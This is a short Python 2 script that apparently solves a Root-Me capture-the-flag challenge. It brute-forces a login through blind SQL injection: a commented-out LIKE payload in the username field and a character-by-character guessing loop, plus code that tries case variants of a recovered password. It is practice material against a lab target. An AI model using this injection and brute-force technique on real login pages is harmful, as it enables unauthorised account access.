import httplib, urllib
import sys
import string


MSG_OK = "Welcome back"
MSG_ERROR = "Error : no such user"

def go(passwd):
  params = urllib.urlencode(
  {
    #'username': "admin' and password like '%"+passwd+"' -- ", 
    'username': "admin",     
    'password': passwd
    })
  headers = {"Content-type": "application/x-www-form-urlencoded",
             "Accept": "text/plain"}
  conn = httplib.HTTPConnection("challenge01.root-me.org")
  conn.request("POST", "/web-serveur/ch10/", params, headers)
  response = conn.getresponse()
  data = response.read()
  conn.close()
  if MSG_OK in data:
    return True
  if MSG_ERROR in data:
    return False
  return None

#passwd = 'e2azo93i'
passwd = ''
alphabet = string.ascii_letters + string.digits + "_/.,!@#$^&*()_-+=`~[]{};:\"\\<>.,/?|"


passwd = [['e', 'E'],['2'],['a', 'A'],['z', 'Z'],['o', 'O'],['9'],['3'],['i', 'I']]


def x(curr, lst):
  if len(lst) == 0:
    print curr, go(curr)
    return

  for o in lst[0]:
    x(curr + o, lst[1:])

x("", passwd)

"""


while True:
  for ch in alphabet:
    res = go(ch + passwd)
    if res is True:
      passwd = ch + passwd
      print passwd
      sys.stdout.flush()
      break

    if res is False:
      sys.stdout.write('.')
      sys.stdout.flush()
      continue

    print "NONE WAS RETURNED?!"

  print passwd
print passwd
"""

sadf LIKE 'asdf%'



